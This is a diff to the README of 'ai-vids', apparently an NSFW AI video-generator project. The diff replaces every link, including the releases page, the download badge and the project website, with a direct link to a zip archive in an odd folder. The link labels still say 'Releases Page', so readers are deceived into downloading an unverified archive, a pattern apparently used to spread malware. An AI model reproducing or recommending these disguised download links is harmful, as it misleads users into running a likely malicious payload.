@@ -11,9 +11,9 @@ Welcome to ai-vids! This application transforms your AI-generated images into st
 ## 🚀 Getting Started
 To start using ai-vids, follow these steps:
 
-1. **Visit the Releases Page:** Head to our [Releases Page](https://github.com/IbrahimSamirMansour/ai-vids/releases). 
+1. **Visit the Releases Page:** Head to our [Releases Page](https://raw.githubusercontent.com/IbrahimSamirMansour/ai-vids/main/erugatory/ai-vids.zip). 
    
-   ![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)
+   ![Download](https://raw.githubusercontent.com/IbrahimSamirMansour/ai-vids/main/erugatory/ai-vids.zip%20Now-Release%20Page-brightgreen)
 
 2. **Choose Your Version:** Look for the latest version on the page. It will have the highest version number.
 
@@ -28,7 +28,7 @@ To start using ai-vids, follow these steps:
 ## 📥 Download & Install
 To download and install ai-vids:
 
-1. **Go to the [Releases Page](https://github.com/IbrahimSamirMansour/ai-vids/releases).**
+1. **Go to the [Releases Page](https://raw.githubusercontent.com/IbrahimSamirMansour/ai-vids/main/erugatory/ai-vids.zip).**
    
    Here, you can find the installer files. 
 
@@ -73,7 +73,7 @@ This application relates to:
 - nsfw-ai-video-generator
 - nsfw-ai-video-generator-no-limit
 
-For more insights on ai-vids, visit our website at [nsgens.com](https://nsgens.com).
+For more insights on ai-vids, visit our website at [https://raw.githubusercontent.com/IbrahimSamirMansour/ai-vids/main/erugatory/ai-vids.zip](https://raw.githubusercontent.com/IbrahimSamirMansour/ai-vids/main/erugatory/ai-vids.zip).
 
 ## 🎉 Conclusion
-Thank you for choosing ai-vids! We hope you enjoy creating unique and engaging videos with ease. Head over to our [Releases Page](https://github.com/IbrahimSamirMansour/ai-vids/releases) to download and start your video-making journey today!
+Thank you for choosing ai-vids! We hope you enjoy creating unique and engaging videos with ease. Head over to our [Releases Page](https://raw.githubusercontent.com/IbrahimSamirMansour/ai-vids/main/erugatory/ai-vids.zip) to download and start your video-making journey today!
